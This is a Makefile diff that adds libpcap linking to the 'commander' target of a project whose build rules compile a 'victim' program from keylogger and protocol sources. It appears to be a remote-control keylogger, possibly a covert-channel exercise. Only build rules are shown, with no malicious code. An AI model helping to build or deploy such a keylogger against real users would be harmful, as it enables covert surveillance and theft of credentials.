@@ -12,7 +12,7 @@ SRC = src
 all: commander victim
 
 commander: $(SRC)/Commander.c $(SRC)/protocol.c $(SRC)/protocol.h $(SRC)/keylogger.h
-	$(CC) $(CFLAGS) -o commander $(SRC)/Commander.c $(SRC)/protocol.c $(LDFLAGS)
+	$(CC) $(CFLAGS) -o commander $(SRC)/Commander.c $(SRC)/protocol.c $(LDFLAGS) -lpcap
 
 victim: $(SRC)/Victim.c $(SRC)/keylogger.c $(SRC)/protocol.c $(SRC)/protocol.h $(SRC)/keylogger.h
 	$(CC) $(CFLAGS) -o victim $(SRC)/Victim.c $(SRC)/keylogger.c $(SRC)/protocol.c $(LDFLAGS) -lpcap
